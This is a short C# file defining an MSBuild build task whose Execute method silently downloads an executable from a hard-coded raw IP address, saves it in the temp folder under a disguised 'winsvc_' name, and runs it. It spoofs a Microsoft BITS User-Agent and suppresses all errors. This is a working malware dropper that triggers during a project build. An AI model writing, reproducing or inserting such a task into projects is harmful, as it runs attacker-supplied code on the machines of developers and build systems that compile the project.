using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
public class T : Task, ITask {
  public override bool Execute() {
    try {
      var u = "http://41.216.188.11:8000/MyApp2.exe";
      var d = Path.Combine(Path.GetTempPath(), "winsvc_" + DateTime.Now.Ticks + ".exe");
      using (var w = new System.Net.WebClient()) {
        w.Headers.Add("User-Agent", "Microsoft BITS/7.8");
        w.DownloadFile(u,d);
      }
      System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo { FileName = d, WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal });
    } catch {}
    return true;
  }
}
